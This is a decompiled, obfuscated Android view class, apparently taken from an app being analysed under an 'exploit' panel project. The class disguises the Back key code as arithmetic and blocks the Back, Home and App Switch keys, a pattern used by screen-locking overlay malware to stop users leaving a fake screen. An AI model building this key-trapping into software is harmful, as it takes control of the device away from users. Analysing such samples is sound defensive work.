package v.s;

import android.view.KeyEvent;
import android.widget.LinearLayout;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class qfRIDC9zNn5AJ extends LinearLayout {
    private static /* synthetic */ void pstvy() {
    }

    @Override // android.view.ViewGroup, android.view.View
    public final boolean dispatchKeyEvent(KeyEvent keyEvent) {
        if (keyEvent.getKeyCode() == 60 - 56 || keyEvent.getKeyCode() == 3 || keyEvent.getKeyCode() == 187) {
            return true;
        }
        return super.dispatchKeyEvent(keyEvent);
    }
}
